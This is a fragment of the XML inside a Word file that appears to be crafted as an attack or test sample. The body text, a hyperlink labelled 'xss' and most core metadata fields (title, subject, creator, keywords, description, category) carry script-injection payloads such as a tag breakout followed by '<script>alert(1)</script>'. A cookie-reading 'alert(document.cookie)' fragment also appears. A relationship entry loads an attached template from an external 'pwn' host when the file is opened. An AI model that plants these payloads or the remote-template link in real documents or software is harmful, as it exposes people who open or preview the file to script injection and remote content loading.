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15" w:rsidRDefault="000B554D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId6" w:history="1">
        <w:r w:rsidR="00F60848" w:rsidRPr="00F60848">
          <w:rPr>
            <w:rStyle w:val="a5"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>xss</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00117915" w:rsidRDefault="00117915">
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00117915" w:rsidSect="00757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929" w:rsidRDefault="00591929" w:rsidP="00F60848">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="1">
    <w:p w:rsidR="00591929" w:rsidRDefault="00591929" w:rsidP="00F60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929" w:rsidRDefault="00591929" w:rsidP="00F60848">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="1">
    <w:p w:rsidR="00591929" w:rsidRDefault="00591929" w:rsidP="00F608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3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848"/>
    <w:rsid w:val="000B554D"/>
    <w:rsid w:val="00117915"/>
    <w:rsid w:val="00192C28"/>
    <w:rsid w:val="00211F72"/>
    <w:rsid w:val="00591929"/>
    <w:rsid w:val="00757AE4"/>
    <w:rsid w:val="00C71527"/>
    <w:rsid w:val="00D32769"/>
    <w:rsid w:val="00F6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8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848"/>
    <w:rPr>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="a5">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="a0"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00F6084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608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alert(document.cookie);void(0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
		<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
			<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
			Target="http://pwn.pwn2own.pw/template.dotx"
			TargetMode="External"/>
	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!--&gt;'"/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</dc:title>
  <dc:subject>!--&gt;'"/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</dc:subject>
  <dc:creator>!--&gt;'"/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</dc:creator>
  <cp:keywords>!--&gt;'"/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</cp:keywords>
  <dc:description>!--&gt;'"/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</dc:description>
  <cp:lastModifiedBy>Administrator</cp:lastModifiedBy>
  <cp:revision>7</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2012-09-03T01:20:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2012-09-03T01:29:00Z</dcterms:modified>
  <cp:category>!--&gt;'"/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</cp:category>
  <cp:contentStatus>!--&gt;'"/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</cp:contentStatus>
</cp:coreProperties>
</file>